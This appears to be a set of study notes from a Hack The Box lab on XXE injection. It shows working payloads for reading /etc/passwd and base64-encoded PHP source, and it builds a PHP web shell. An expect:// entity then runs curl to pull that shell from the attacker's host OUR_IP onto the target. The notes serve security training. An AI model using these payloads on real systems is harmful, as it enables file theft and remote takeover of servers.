# 🧆 XML External Entity (XXE) Injection

`XML External Entity (XXE) Injection` vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions.

## Local File Disclosure

When a web application trusts unfiltered XML data from user input, we may be able to reference an external XML DTD document and define new custom XML entities.We can try to define external entities and make them reference a local file, which, when displayed, should show us the content of that file on the back-end server.

Let's imagine a form that treats data like this:

<figure><img src="../../../../.gitbook/assets/image (1427).png" alt=""><figcaption></figcaption></figure>

the form appears to be sending our data in an XML format to the web server, making this a potential XXE testing target. Suppose the web application uses outdated XML libraries, and it does not apply any filters or sanitization on our XML input.

the value of the `email` element is being displayed back to us on the page. To print the content of an external file to the page, we should `note which elements are being displayed, such that we know which elements to inject into`

Let's try to define a new entity and then use it as a variable in the `email`

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

<figure><img src="../../../../.gitbook/assets/image (1428).png" alt=""><figcaption><p><code>This confirms that we are dealing with a web application vulnerable to XXE</code>.</p></figcaption></figure>

Now let's exploit this ->

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

<figure><img src="../../../../.gitbook/assets/image (1429).png" alt=""><figcaption></figcaption></figure>

We can try to to read the source code of the `index.php` file

<figure><img src="../../../../.gitbook/assets/image (1430).png" alt=""><figcaption><p>Did not work</p></figcaption></figure>

because `the file we are referencing is not in a proper XML format, so it fails to be referenced as an external XML entity`

So we need to use PHP wrapper filters that allow us to base64 encode certain resources 'including files', in which case the final base64 output should not break the XML format

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

<figure><img src="../../../../.gitbook/assets/image (1431).png" alt=""><figcaption><p><code>This trick only works with PHP web applications</code></p></figcaption></figure>

## Remote Code Execution with XXE

to gain code execution over the remote server. The easiest method would be to look for `ssh` keys, or attempt to utilize a hash stealing trick in Windows-based web applications, by making a call to our server. If these do not work, we may still be able to execute commands on PHP-based web applications through the `PHP://expect` filter

The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands.

```shell-session
ElFelixi0@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
ElFelixi0@htb[/htb]$ sudo python3 -m http.server 80
```

we can use the following XML code to execute a `curl` command that downloads our web shell into the remote server

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

{% hint style="info" %}
replaced all spaces in the above XML code with `$IFS`, to avoid breaking the XML syntax
{% endhint %}

_**Try to read the content of the 'connection.php' file, and submit the value of the 'api\_key' as the answer.**_

<figure><img src="../../../../.gitbook/assets/image (1433).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (1434).png" alt=""><figcaption></figcaption></figure>
